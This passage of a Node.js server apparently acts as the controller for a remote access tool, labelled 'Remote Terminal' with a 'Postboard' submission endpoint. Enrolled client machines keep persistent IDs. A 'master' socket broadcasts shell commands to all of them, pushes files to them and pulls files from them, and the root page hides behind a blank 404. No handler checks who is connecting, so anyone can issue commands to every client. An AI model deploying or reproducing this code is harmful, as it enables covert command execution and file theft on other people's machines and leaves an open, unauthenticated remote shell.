  console.log('[Postboard] Submission #' + submission.id + ' from ' + uuid +
              ' (' + (filename || 'no name') + ', ' + submission.size + ' bytes)');

  res.json({ success: true, id: submission.id, size: submission.size });
});

app.get('/submission', (req, res) => {
  res.type('text/plain').send(
    'Remote Terminal — Postboard submission endpoint\\n' +
    '\\n' +
    'POST application/json:\\n' +
    '  { "uuid": "<uuid>", "content": "<text>", "filename": "<optional>" }\\n' +
    '\\n' +
    'POST text/plain:\\n' +
    '  body = raw text; uuid from ?uuid=<uuid> or X-Client-UUID header\\n' +
    '\\n' +
    'Example (from the client directory):\\n' +
    '  node send.js https://your-server/submission myfile.txt\\n'
  );
});

app.get('/submissions', (req, res) => {
  var uuid = (req.query.uuid || '').toString().trim();
  var result = uuid ? submissions.filter(function(s) { return s.uuid === uuid; }) : submissions.slice();
  result.sort(function(a, b) { return b.timestamp - a.timestamp; });
  var limit = parseInt(req.query.limit, 10);
  if (Number.isFinite(limit) && limit > 0) result = result.slice(0, limit);
  res.json(result);
});

// Seen UUIDs, with live counts + online state
app.get('/api/seen', (req, res) => {
  var counts = new Map();
  submissions.forEach(function(s) { counts.set(s.uuid, (counts.get(s.uuid) || 0) + 1); });

  var list = seenUUIDs.map(function(s) {
    var c = clients.get(s.uuid);
    return {
      uuid: s.uuid,
      firstSeen: s.firstSeen,
      lastSeen: s.lastSeen,
      submissionCount: counts.get(s.uuid) || 0,
      online: !!(c && c.socket && c.socket.connected)
    };
  });
  list.sort(function(a, b) { return b.lastSeen - a.lastSeen; });
  res.json(list);
});

// =====================================================
// ==================== PAGE ROUTES ====================
// =====================================================

// Root intentionally disabled — blank 404
app.get('/', (req, res) => res.status(404).end());

app.get('/favicon.ico', (req, res) => res.status(204).end());

app.get('/master', (req, res) => {
  res.sendFile(path.join(publicDir, 'index.html'));
});

app.get('/postboard', (req, res) => {
  res.sendFile(path.join(publicDir, 'postboard.html'));
});

// Catch-all must come last
app.get('/:uuid', (req, res) => {
  res.sendFile(path.join(publicDir, 'index.html'));
});

// =====================================================
// ==================== SOCKET.IO ======================
// =====================================================

io.on('connection', (socket) => {
  let role = null;
  let clientId = null;

  socket.on('heartbeat', () => {
    if (clientId && clientHeartbeats.has(clientId)) {
      clientHeartbeats.set(clientId, Date.now());
    }
  });

  // ---------- CLIENT REGISTRATION (permanent UUID) ----------
  socket.on('register-client', (payload) => {
    role = 'client';
    const connectionEpoch = Date.now();

    let oldId = null;
    if (typeof payload === 'string') {
      oldId = payload;
    } else if (payload && typeof payload === 'object') {
      oldId = (typeof payload.clientId === 'string' && payload.clientId.length > 0)
        ? payload.clientId
        : null;
    }

    const validOldId = (typeof oldId === 'string' && /^[A-Za-z0-9_-]{8,128}$/.test(oldId))
      ? oldId
      : null;

    if (validOldId) {
      const existing = clients.get(validOldId);
      if (existing && existing.socket && existing.socket.connected) {
        clientId = validOldId;
        existing.socket = socket;
        existing.epoch = connectionEpoch;
        existing.cwd = existing.cwd || (process.platform === 'win32'
          ? process.env.USERPROFILE || process.cwd()
          : process.cwd());
        console.log(`Client reconnected with existing UUID: ${clientId}`);
      } else {
        clientId = validOldId;
        clients.set(clientId, {
          socket: socket,
          epoch: connectionEpoch,
          cwd: (process.platform === 'win32'
            ? process.env.USERPROFILE || process.cwd()
            : process.cwd()),
          env: {}
        });
        console.log(`Client registered with permanent UUID: ${clientId}`);
      }
      socket.emit('registered', clientId);
    } else {
      clientId = uuidv4();
      clients.set(clientId, {
        socket: socket,
        epoch: connectionEpoch,
        cwd: (process.platform === 'win32'
          ? process.env.USERPROFILE || process.cwd()
          : process.cwd()),
        env: {}
      });
      console.log(`Client registered with new UUID: ${clientId}`);
      socket.emit('registered', clientId);
    }

    // Record in seen list
    markUUIDSeen(clientId);

    clientHeartbeats.set(clientId, Date.now());

    const clientData = clients.get(clientId);
    socket.emit('directory', clientData.cwd);

    socket.on('disconnect', () => {
      const current = clients.get(clientId);
      if (!current || current.epoch !== connectionEpoch) return;

      console.log(`Client ${clientId} disconnected`);
      clientHeartbeats.delete(clientId);

      const conns = viewers.get(clientId);
      if (conns) conns.forEach(s => s.emit('system', '[System] Client disconnected'));
      masters.forEach(ms => ms.emit('system', `[System] Client ${clientId} disconnected`));

      setTimeout(() => {
        const entry = clients.get(clientId);
        if (entry && entry.epoch === connectionEpoch && (!entry.socket || !entry.socket.connected)) {
          clients.delete(clientId);
          console.log(`Cleaned up stale client entry: ${clientId}`);
        }
      }, 60000);
    });

    socket.on('output', (data) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('output', `[${clientId}] ${data}`));
      masters.forEach(ms => ms.emit('output', `[${clientId}] ${data}`));
    });

    socket.on('error', (data) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('error', `[${clientId}] ${data}`));
      masters.forEach(ms => ms.emit('error', `[${clientId}] ${data}`));
    });

    socket.on('system', (data) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('system', `[${clientId}] ${data}`));
      masters.forEach(ms => ms.emit('system', `[${clientId}] ${data}`));
    });

    socket.on('directory', (dir) => {
      const cd = clients.get(clientId);
      if (cd) cd.cwd = dir;
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('directory', dir));
      masters.forEach(ms => ms.emit('system', `[${clientId}] Directory changed to: ${dir}`));
    });

    socket.on('run-command', (cmd) => {
      socket.emit('command', cmd);
    });

    socket.on('file-download-start', (meta) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('download-start', meta));
      masters.forEach(ms => ms.emit('download-start', meta));
    });
    socket.on('file-download-chunk', (data) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('download-chunk', data));
      masters.forEach(ms => ms.emit('download-chunk', data));
    });
    socket.on('file-download-end', () => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('download-end'));
      masters.forEach(ms => ms.emit('download-end'));
    });
    socket.on('file-download-error', (msg) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('download-error', msg));
      masters.forEach(ms => ms.emit('download-error', msg));
    });

    socket.on('file-uploaded', (data) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('upload-complete', data));
      masters.forEach(ms => ms.emit('upload-complete', data));
    });
    socket.on('file-upload-error', (msg) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('upload-error', msg));
      masters.forEach(ms => ms.emit('upload-error', msg));
    });
    socket.on('upload-progress', (data) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('upload-progress', data));
      masters.forEach(ms => ms.emit('upload-progress', data));
    });
  });

  // ---------- VIEWER REGISTRATION ----------
  socket.on('register-viewer', (id) => {
    role = 'viewer';
    clientId = id;
    if (!clients.has(clientId)) {
      socket.emit('system', '[System] Error: Client not connected or invalid UUID');
      return;
    }
    if (!viewers.has(clientId)) viewers.set(clientId, new Set());
    viewers.get(clientId).add(socket);

    const clientData = clients.get(clientId);
    socket.emit('system', `[System] Connected to client ${clientId}`);
    socket.emit('directory', clientData.cwd);

    socket.on('command', (cmd) => {
      clientData.socket.emit('run-command', cmd);
      socket.emit('command', cmd);
    });

    socket.on('disconnect', () => {
      const set = viewers.get(clientId);
      if (set) {
        set.delete(socket);
        if (set.size === 0) viewers.delete(clientId);
      }
    });

    socket.on('upload-start', (meta) => { clientData.socket.emit('file-upload-start', meta); });
    socket.on('upload-chunk', (data) => { clientData.socket.emit('file-upload-chunk', data); });
    socket.on('upload-end', (data) => { clientData.socket.emit('file-upload-end', data); });

    socket.on('download-request', (data) => {
      clientData.socket.emit('file-download-request', { path: data.path });
    });
  });

  // ---------- MASTER REGISTRATION ----------
  socket.on('register-master', () => {
    role = 'master';
    masters.add(socket);
    socket.emit('system', '[System] Registered as master terminal');
    console.log('Master terminal connected');

    socket.on('command', (cmd) => {
      clients.forEach(({ socket: clientSocket }) => clientSocket.emit('run-command', cmd));
      socket.emit('command', cmd);
    });

    socket.on('disconnect', () => {
      masters.delete(socket);
      console.log('Master terminal disconnected');
    });

    socket.on('upload-start', (meta) => {
      if (meta.targets === null) {
        clients.forEach((client) => client.socket.emit('file-upload-start', meta));
      } else {
        meta.targets.forEach(id => {
          const client = clients.get(id);
          if (client && client.socket && client.socket.connected) {
            client.socket.emit('file-upload-start', meta);
          }
        });
      }
    });

    socket.on('upload-chunk', (data) => {
      if (data.targets === null) {
        clients.forEach((client) => client.socket.emit('file-upload-chunk', data));
      } else {
        data.targets.forEach(id => {
          const client = clients.get(id);
          if (client && client.socket && client.socket.connected) {
            client.socket.emit('file-upload-chunk', data);
          }
        });
      }
    });

    socket.on('upload-end', (data) => {
      if (data.targets === null) {
        clients.forEach((client) => client.socket.emit('file-upload-end', data));
      } else {
        data.targets.forEach(id => {
          const client = clients.get(id);
          if (client && client.socket && client.socket.connected) {
            client.socket.emit('file-upload-end', data);
          }
        });
      }
    });

    socket.on('download-request', (data) => {
      if (data.targets === null || data.targets.length === 0) {
        const firstEntry = clients.entries().next().value;
        if (firstEntry) {
          const [, client] = firstEntry;
          if (client.socket && client.socket.connected) {
            client.socket.emit('file-download-request', { path: data.path });
          } else {
            socket.emit('download-error', 'No connected clients available');
          }
        } else {
          socket.emit('download-error', 'No connected clients available');
        }
      } else {
        const targetId = data.targets[0];
        const client = clients.get(targetId);
        if (client && client.socket && client.socket.connected) {
          client.socket.emit('file-download-request', { path: data.path });
        } else {
          socket.emit('download-error', 'Target client [' + targetId + '] not connected');
        }
      }
    });
  });

  // ---------- TARGETED COMMAND ----------
  socket.on('targeted-command', ({ uuids, cmd }) => {
    if (!Array.isArray(uuids) || typeof cmd !== 'string' || cmd.trim() === '') {
      socket.emit('system', '[System] Invalid targeted command payload');
      return;
    }
    uuids.forEach(id => {
      const client = clients.get(id);
      if (client && client.socket && client.socket.connected) {
        client.socket.emit('run-command', cmd);
      } else {
        socket.emit('system', `[System] Client ${id} unavailable or not connected`);
      }
    });
    socket.emit('command', cmd);
  });
});

// ---------- heartbeat health check ----------
setInterval(() => {
  const now = Date.now();
  const STALE_THRESHOLD = 90000;
  for (const [id, lastHeartbeat] of clientHeartbeats) {
    if (now - lastHeartbeat > STALE_THRESHOLD) {
      const client = clients.get(id);
      if (client && client.socket && client.socket.connected) {
        console.log(`[Health] Client ${id} stale (no heartbeat for ${Math.round((now - lastHeartbeat)/1000)}s) – forcing disconnect`);
        client.socket.disconnect(true);
      }
      clientHeartbeats.delete(id);
    }
  }
}, 30000);

// Flush seen UUIDs on shutdown
process.on('SIGINT', () => { try { saveSeenUUIDs(); } catch {} process.exit(0); });
process.on('SIGTERM', () => { try { saveSeenUUIDs(); } catch {} process.exit(0); });

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT}`);
  console.log(`  Master:     http://localhost:${PORT}/master`);
  console.log(`  Postboard:  http://localhost:${PORT}/postboard`);
  console.log(`  Viewer:     http://localhost:${PORT}/<uuid>`);
  console.log(`  Submit:     POST http://localhost:${PORT}/submission`);
});